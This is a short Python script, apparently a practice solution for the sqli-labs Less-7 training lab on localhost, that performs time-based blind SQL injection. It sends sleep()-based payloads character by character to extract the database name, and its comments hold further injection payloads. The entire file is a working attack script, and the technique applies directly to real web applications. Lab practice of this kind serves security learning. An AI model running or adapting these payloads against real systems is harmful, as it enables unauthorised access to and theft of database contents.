import requests
import time
# 时间注入能行

url = "http://127.0.0.1/sqli-labs-master/Less-7/"
dict = "0123456789abcdefghijklmnopqrstuvwxyz{}-"
flag = ""
for i in range(1, 10):
    for j in dict:
        payload = f"?id=1')) and if(substr((database()),{i},1)=\"{j}\",sleep(5),0)--+"
                                                    # 1'))order by 3--+
        # ?id=1' and if(length(database())=8,sleep(5),1)--+
        gloal = url + payload
        start = time.time()
        res = requests.get(url=gloal)
        end = time.time()
        if end - start > 4.9:
            flag += j
            print(flag)
            break
